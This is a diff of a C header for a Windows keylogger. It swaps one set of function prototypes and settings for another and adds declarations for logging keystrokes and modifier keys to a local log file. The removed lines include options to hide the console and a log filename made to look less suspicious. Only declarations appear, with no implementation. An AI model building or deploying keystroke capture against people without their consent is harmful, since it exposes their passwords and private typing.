@@ -1,26 +1,51 @@
 #ifndef KEYLOGGER_H
 #define KEYLOGGER_H
 
-#include <stdio.h>
 #include <windows.h>
-#include <time.h>
+#include <stdio.h>
+#include <ctype.h>
 
-// Set to 1 to make the console invisible (0 - False, 1 - True).
-#define INVISIBLE_CONSOLE 0
+/* Defines */
+#define LOGFILE "log.txt"
+#define KEY_PRESSED 0x8000
+#define CAPSLOCK_MASK 0x0001
 
-// Set to 1 to suppress console output (0 - False, 1 - True).
-#define SILENT_CONSOLE 0    
+/* functions */
+/**
+ * Logs the input string to the log file.
+ *
+ * @param input The string to be logged.
+ */
+void logKey(const char *input);
 
-// Time interval in seconds to check for key presses.
-#define LISTENER_TIMER 5    
+/**
+ * Handles special keys and modifier keys.
+ *
+ * @param key The key code.
+ * @return 1 if the key is handled as a special key (or a modifier) and no further logging is needed, 0 otherwise.
+ */
+int handleSpecialKeys(int key);
 
-// Name of the log file.
-#define FILE_NAME "activity_log.txt"  // Change from keylog.txt
+/**
+ * Maps a key code to its shifted equivalent.
+ *
+ * @param key The key code.
+ * @return The corresponding shifted character.
+ */
+char mapWithShift(int key);
 
-void verifyStealthMode();
-void savePressedKey(char pressedKey, const char fileName[]);
-int getPressedKeyBetweenASCII(int ASCIIValue1, int ASCIIValue2);
-int getFileLength(const char fileName[]);
-void overrideFile(const char fileName[]);
+/**
+ * Handles key press events by logging the appropriate character.
+ *
+ * @param key The key code.
+ */
+void handleKeyPress(int key);
 
-#endif
+/**
+ * Handles key release events by updating modifier flags.
+ *
+ * @param key The key code.
+ */
+void handleKeyRelease(int key);
+
+#endif // KEYLOGGER_H
